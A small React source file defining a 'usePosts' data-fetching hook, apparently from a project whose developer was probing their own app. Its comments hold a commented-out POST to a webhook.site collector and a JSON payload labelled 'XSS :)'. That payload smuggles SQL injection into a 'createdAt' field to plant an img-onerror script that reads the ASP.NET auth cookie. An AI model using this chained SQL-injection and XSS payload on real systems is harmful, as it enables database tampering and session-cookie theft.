import React, {useCallback} from "react";
import {useFetchErrorWrapper} from "./useFetchErrorWrapper";
// fetch("https://webhook.site/2a31afb2-3a5e-449c-abdb-ab8919ea55b4", {body: "test123", method: "POST"})


export const usePosts = () => {
    const fetchCall = useCallback(
        (fetch) => fetch("/api/posts"),
        []
    );

    return useFetchErrorWrapper(fetchCall, []);
}

/* XSS :)
{
   "content":"asd",
   "createdAt":"2022-03-28T20:16:45.583Z' WHERE ID=1; UPDATE Posts SET CreatedAt='2022-03-28T20:16:45.583Z', Content='<p>tzttttt</p><img src=\"https://www.erorerer123.com/a.jpg\" onerror=\"cookieStore.get(''.AspNetCore.Cookies'').then(function(c){{alert(c.value)}})\" />"
}
* */